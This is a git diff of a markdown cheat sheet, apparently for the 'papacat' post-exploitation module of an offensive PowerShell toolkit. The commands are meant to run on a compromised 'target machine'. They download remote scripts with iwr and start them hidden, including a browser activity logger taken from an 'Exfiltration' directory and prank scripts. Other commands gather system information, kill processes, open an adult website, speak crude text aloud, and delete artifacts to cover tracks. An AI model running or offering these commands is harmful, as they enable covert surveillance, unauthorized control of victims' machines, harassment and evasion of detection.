@@ -119,9 +119,13 @@ iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e
 
 # papacat at post-exploitation
 
-#### Send one message to target machine
+#### Retrieve remote system information
 ```powershell
-echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt;Start-Sleep -S 3;del ola.txt
+systeminfo|Out-File systeminfo.log -force
+echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo ""
+
+# CleanUP artifacts
+Remove-Item systeminfo.log -force
 ```
 
 #### Stop\Start remote processes
@@ -133,6 +137,11 @@ Start https://youporn.com
 Stop-Process -Name "notepad.exe" -Force
 ```
 
+#### Send one message to target machine
+```powershell
+echo "Carrega no [F11] no teclado para abortar o update." > ola.log;start ola.log;Start-Sleep -S 3;del ola.log
+```
+
 <br />
 
 #### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
@@ -141,16 +150,16 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiR
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
 ```
 
-#### Do A Barrel Roll Loop Prank ( loop prank 5 times with 20 seconds delay before next loop )
+#### Do A Barrel Roll Loop Prank ( loop prank 5 times with 17 seconds delay before next loop )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1"
-Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 20 -AutoDel on -MsgBoxClose 18"
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 17 -AutoDel on -MsgBoxClose 20"
 ```
 
 #### Speak a frase to remote host
 ```powershell
-$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       kkkkkkUU       U  ii          THE END"
-Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 95;$SpeakObect.Rate = -4;$SpeakObect.Speak($SPEAKME)
+$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       k U khhhr UU  rRr     U  ii          THE END"
+Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 99;$SpeakObect.Rate = -3;$SpeakObect.Speak($SPEAKME)
 ```
 
 <br />
@@ -160,7 +169,7 @@ Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synt
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file BrowserLogger.ps1 -force 'true' -log"
 
-# Manual stop browserLogger process thats running in background
+# Manual stop browserLogger process thats still running in background
 $PPID = (Get-Content -Path "Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
 Stop-Process -Id "$PPID" -Force
 
@@ -170,7 +179,7 @@ Get-Content -Path "Browser.report"
 # OR get only the windows title strings
 Get-Content -Path "Browser.report"|Select-String -Pattern 'Windows Title   :'
 
-# CleanUp
+# CleanUp artifacts
 Remove-Item BrowserLogger.ps1 -force
 Remove-Item Browser.report -force
 ```
